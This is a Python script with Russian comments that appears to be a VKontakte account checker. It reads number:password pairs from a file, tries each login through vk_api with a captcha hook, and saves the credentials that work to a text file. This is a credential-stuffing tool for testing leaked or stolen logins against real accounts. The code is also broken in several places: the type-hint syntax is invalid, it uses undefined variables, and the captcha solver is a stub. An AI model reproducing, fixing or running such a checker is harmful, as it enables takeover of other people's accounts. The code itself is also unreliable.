import vk_api
import requests






class Checker_vk:
	
	validate_acc = []

	#ПРОЦЕСС АВТОРИЗАЦИИ
	def authorization(self,number -> str, password -> str) -> None:
		self.vk_session = vk_api.VkApi(number,
								password,
								captcha_handler=self.get_captcha)
		try:
			print(vk_session.auth())
			
		except Exception as e:
			self.error(e)
		else:
			self.validation(number,password)
	
	#ДОБАВЛЕНИЕ УСПЕШНЫХ АККАУНТОВ
	def validation(self,number -> str,password -> str) -> None:
		self.validate_acc.append(f"[+]{number}:{password}")
	
	#УСПЕШНЫЕ АККАУНТЫ
	def succesfully_operations(self) -> None:
		print("success",self.validate_acc)
		if self.validate_acc:
			with open("vidate_accounts.txt","w") as f:
				f.write("\n".join(self.validate_acc))
		else:
			print("Ничего не нашел")
	

	#ПОЛУЧЕНИЕ КАПЧИ
	def get_captcha(self,text):
		print("ТИП ",type(text))
		self.sid,self.link_photo = text.sid,text.get_url()
	
	#РЕШЕНИЕ КАПЧИ
	def captcha_decision(self,text):
		
		self.vk_session.try_again(response)
	
	#ОБРАБОТКА ОШИБОК
	def error(self,text):
		dct_error = {
			"Bad password" : "Неправильный пароль или номер!",
		}
		print(text)
		#print(dct_error.get(text,"Неопознанная ошибка"))






def main():
	users = Checker_vk()
	with open("acc.txt","r") as f:
		accs = f.read().split()
		print(accs)
	for acc in accs:
		number,password = acc.split(":")
		users.authorization(number,password=password)
	else:
		users.succesfully_operations()
main()
	